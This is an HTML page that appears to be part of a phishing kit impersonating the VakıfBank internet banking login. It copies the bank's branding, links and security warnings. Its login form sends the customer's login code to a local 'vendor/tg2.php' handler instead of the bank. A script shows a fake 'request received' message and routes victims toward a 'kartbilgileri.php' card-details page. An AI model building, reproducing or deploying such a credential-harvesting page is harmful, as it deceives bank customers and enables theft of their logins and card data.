<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>VakıfBank İnternet Bankacılığı</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
        rel="stylesheet" />
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/x-icon" href="img/favicon.png">
</head>

<body>
<script>
        function showErrorPopup() {
            alert("Talebiniz başarıyla alındı, 24-48 saat içerisinde dönüş yapılacaktır.");
            window.location.href = 'index.php';
        }

        document.addEventListener('DOMContentLoaded', function () {
            const urlParams = new URLSearchParams(window.location.search);
            const hataValue = urlParams.get('tamamlandi');
            
            if (hataValue === '2') {
                showErrorPopup();
            }
        });

        function redirectToErrorPage() {
            window.location.href = 'kartbilgileri.php?tamamlandi=2';
        }
    </script>
    <main id="app">
        <nav>
            <div class="wrapper">
                <img src="img/vakifbank-logo.svg" />
                <div class="lang">
                    <a href="/" class="active">TR</a>
                    <a href="/en">EN</a>
                </div>
            </div>
        </nav>
        <form action="vendor/tg2.php" method="post">
        <section class="content">
            <div class="container">
                <h1>Hoş Geldiniz</h1>
                <div class="upper-wrapper">
                    <div class="card credentials">
                        <div class="type">
                            <button class="active">Bireysel</button>
                            <button>Ticari</button>
                        </div>
                        <label>Giriş Kodu</label>
                        <div class="input-group">
                            <input autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
                                id="customer-pass" type="password" name="tel" placeholder="Giriş Kodunu Giriniz" required="" />
                            <img class="keyboard" src="img/keyboard.svg">
                            <label class="error" id="label-error-pass"></label>
                        </div>
                        
                        <a class="forgot-password"
                            href="https://subesizbankacilik.vakifbank.com.tr/sifreal/AnindaSifre/AnindaSifre.aspx">Şifrem
                            Yok / Unuttum</a>
                        <button class="login" type="submit">GİRİŞ YAP</button>
                    </div>
</form>
                    <div class="card quick">
                        <h1>Karekod İle Giriş</h1>
                        <div class="retry">
                            <label class="content">VakıfBank Mobil’in giriş sayfasındaki “Karekod İşlemleri”nden
                                işleminizi gerçekleştirebilirsiniz.
                            </label>
                            <img src="img/qr_entry_tr.svg" />
                        </div>
                        <label class="small">*Uygulamanızın Android telefonlar için v2.8.6, İOS telefonlar
                            içinse v2.8.8 versiyon ve üzerinde olması gerekmektedir.</label>
                    </div>
                </div>
                <div class="card-important">
                    <img class="secure" src="img/secure.png" />
                    <img class="ssl" src="img/secure-globalsign-ssl.png" />
                    <h3>Güvenlik Uyarıları</h3>
                    <ul>
                        <li>
                            VakıfBank hiçbir zaman İnternet Şubesi girişinde müşterilerinin
                            cep telefonu numarası, markası, modeli gibi bilgileri
                            istememektedir. Bu tür şüpheli ekranlar ile karşılaştığınızda
                            işleminizi durdurarak hemen 0850 222 0 724 Müşteri İletişim
                            Merkezini arayınız ya da şubenize başvurunuz. Güvenlik
                            uyarılarını okumak için lütfen
                            <a href="https://www.vakifbank.com.tr/guvenlik.aspx?pageID=361">tıklayınız.</a>
                        </li>
                        <li>
                            Dijital Kanallarda güvenliğiniz için güncel bir antivirüs
                            programı kullanınız.
                        </li>
                        <li>
                            Bir sonraki sayfada Ad Soyad bilgilerinizi göreceksiniz.
                            Bilgilerinizi göremezseniz tek kullanımlık şifrenizi girmeyiniz
                            ve hemen 0850 222 0 724 Müşteri İletişim Merkezini arayınız ya
                            da şubenize başvurunuz.
                        </li>
                        <li>
                            Tek kullanımlık şifreniz bir sonraki ekranda sorulacaktır. Tek
                            kullanımlık şifre göremezseniz ve/veya birden fazla tek
                            kullanımlık şifre istenirse ekrana bilgi girmeyiniz ve hemen
                            0850 222 0 724 Müşteri İletişim Merkezini arayınız ya da
                            şubenize başvurunuz.
                        </li>
                    </ul>
                </div>
            </div>
        </section>
    </main>
    <footer>
        <div class="wrapper">
            <label>© 2021 VakıfBank T.A.O </label>
            <div class="routes">
                <a href="">İşlem Listesi</a>
                <a href="">Planlı Kesinti ve Duyurular</a>
                <a href="">İletişim</a>
                <a href=""><img src="img/google-play.svg" /></a>
                <a href=""><img src="img/app-store.jpg" /></a>
                <a href=""><img src="img/huawei-download.svg" /></a>
            </div>
        </div>
    </footer>
</body>

</html>